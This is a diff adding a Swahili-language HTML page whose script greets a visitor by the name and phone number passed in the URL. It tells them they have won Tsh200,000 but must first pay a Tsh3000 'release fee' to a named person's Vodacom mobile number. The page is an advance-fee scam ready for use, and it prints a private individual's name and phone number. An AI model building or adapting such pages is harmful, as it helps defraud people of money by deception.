@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>MainActivity4 - Malipo na Ofa</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100vh;
+    background-image: url('zuchu1.jpg'); /* Replace with your drawable background if needed */
+    background-size: cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .container {
+    width: 90%;
+    max-width: 600px;
+    padding: 20px;
+    box-sizing: border-box;
+    background-color: rgba(0, 0, 0, 0.3); /* semi-transparent background for readability */
+    border-radius: 10px;
+    color: white;
+  }
+  #payText {
+    font-size: 14px;
+    font-weight: bold;
+    white-space: pre-wrap;
+    margin-top: 10px;
+  }
+  #backButton {
+    margin-top: 12px;
+    padding: 10px 20px;
+    font-size: 12px;
+    cursor: pointer;
+    border: none;
+    background-color: #2196F3;
+    color: white;
+    border-radius: 5px;
+  }
+  #backButton:hover {
+    background-color: #ADD8E6;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2 style="color: white;">Malipo Na ofa</h2>
+  <div id="payText"></div>
+  <button id="backButton">Nyuma</button>
+</div>
+
+<script>
+// Function to get URL parameters
+function getQueryParam(param) {
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get(param);
+}
+
+// Retrieve offerPart1 and offerPart2 from URL (if needed)
+const offerPart1 = getQueryParam('offerPart1') || '';
+const offerPart2 = getQueryParam('offerPart2') || '';
+
+// Retrieve name and phone_number from URL parameters
+const name = getQueryParam('name') || 'Hakuna Jina';
+const phoneNumber = getQueryParam('phone_number') || 'Hakuna Namba';
+
+// Construct the instruction message with extra blank lines after each line
+const instructionText = `Hongera ${name}(${phoneNumber}) Umechaguliwa Kupokea Tsh200,000.
+
+Unatakiwa Kulipia Tsh3000, Ada Ya Utoaji Ili Upokee Ofa Yako.  
+
+Fuata Maelezo Haya Ili Ufanye Malipo Yako. Malipo Yanafanywa kwenye Nambari Rasmi Ya katibu (Amos Cosmas Paulo).
+
+Baada Ya Kufanya Malipo Yako Utapokea Ofa Yako Ya Tsh200,000. Baada Ya Dakika Tano.
+
+Utapokea Ofa Yako Kwenye Laini Yako Kisha Utapigiwa Simu Ili uweze Kuthibitisha.
+
+Nambari Ya Malipo Hii Hapa. Thibitisha Nambari Usije Ukakosea.
+
+                Nambari: 0767905046
+
+                Jina: Amos Cosmas Paulo
+
+                Mtandao: Vodacom
+
+                Kiasi: 3000`;
+
+// Display the message
+document.getElementById('payText').textContent = instructionText;
+
+// Handle back button click
+document.getElementById('backButton').addEventListener('click', () => {
+  window.location.href = 'index3.html';
+});
+</script>
+
+</body>
+</html>
